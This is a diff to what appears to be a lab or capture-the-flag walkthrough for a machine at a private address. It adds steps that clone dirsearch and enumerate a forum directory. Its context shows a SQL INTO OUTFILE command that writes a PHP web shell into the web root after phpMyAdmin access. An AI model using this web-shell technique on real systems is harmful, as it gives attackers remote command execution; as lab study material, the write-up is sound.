@@ -70,6 +70,8 @@ PORT    STATE SERVICE
 
 We can see that port 80 is open, so a web service is running.
 
+git clone https://github.com/maurosoria/dirsearch.git
+
 We can use `dirsearch` to enumerate potential paths at `192.168.56.108`.
 
 ```bash
@@ -161,6 +163,14 @@ the login for DB is :
 ## Database Access
 
 Now we can go on https://192.168.56.108/phpmyadmin/
+
+we look for the directory where we can create a file that will be a page with dirsearch
+
+python dirsearch.py -u https://192.168.56.108/forum/ 
+
+we find : [12:35:51] 200 -    5KB - /forum/templates_c/
+
+we know that the site is using apache so the pages are in /var/www/forum/
 
 we run the SQL command : SELECT "<?php system($\_GET['cmd']) ?>" into outfile "/var/www/forum/templates_c/exploit.php"
 
